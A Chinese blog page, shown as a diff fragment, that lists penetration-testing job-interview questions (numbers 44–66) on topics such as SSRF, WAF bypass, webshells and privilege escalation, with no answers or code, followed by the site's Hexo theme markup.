+<p><strong>44、 我们的项目不是 PHP，是 JAVA 开发的？如果要让你去做代码审计，你能搞定吗？</strong><br><strong>45、 Python 了解多少？具体做过些什么开发？</strong><br><strong>46、 你用 Python 解决了哪些问题？</strong><br><strong>47、 面对一个系统，需要进行渗透，但是通过初步确认发现完全没有切入点，你接下来打算怎么办？</strong><br><strong>48、 如果一个系统或框架可能存在 0Day，你如何确认这个漏洞，会使用什么方法？</strong><br><strong>49、 如果使用 Python 来编写一个漏洞扫描程序，你打算如何做？</strong><br><strong>50、 请问你如何进行信息采集？</strong><br><strong>51、 作为一个攻击者，你会如何使用漏扫工具？</strong><br><strong>52、 请描述有哪些手段可以 GetShell？</strong><br><strong>53、 了解 SSRF 漏洞吗？你如何利用 SSRF 漏洞？</strong></p>
+<p><strong>54、 请说明如何有效利用 Redis 漏洞。</strong><br><strong>55、 你如何确定目标系统存在 WAF 或 IPS？</strong><br><strong>56、 如何绕过 WAF 进行渗透？</strong><br><strong>57、 什么是中间人攻击，你如何利用中间人攻击？</strong><br><strong>58、 如果某个 RCE 漏洞无法回显，你打算怎么做？</strong><br><strong>59、 如果一台 MySQL 服务器与 Web 服务器隔离，并且发现 Web 页面存在 SQL 注入漏洞，你打算如</strong><br><strong>何利用 SQL 注入漏洞？</strong></p>
+<p><strong>60、 如果要对某个特定目标进行信息采集，你会怎么做？</strong><br><strong>61、 当你访问一个目标系统时，迎面而来一个登陆框，别的什么功能都没有，你打算如何下手？</strong><br><strong>62、 讲一下你的渗透项目，是如何渗透这个网站的。</strong><br><strong>63、 当你拿到 WebShell 后，你将如何隐蔽自已</strong><br><strong>64、 了解 MYSQL 提权方式吗？具体如何做的。</strong><br><strong>65、 Windows 环境中有哪些提权的方式？</strong><br><strong>66、 Linux 系统中有哪些提权方式？用过哪些提权漏洞？</strong></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E9%9D%A2%E8%AF%95/" rel="tag"># 面试</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/08/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E8%AE%AD%E7%BB%83/" rel="prev" title="PHP反序列化-训练">
+      <i class="fa fa-chevron-left"></i> PHP反序列化-训练
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/08/26/java%E6%BC%8F%E6%B4%9E-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="next" title="java漏洞-反序列化">
+      java漏洞-反序列化 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">鹿祁</p>
+  <div class="site-description" itemprop="description">心有希冀，目有繁星，追光而遇，沐光而行</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">219</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">鹿祁</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
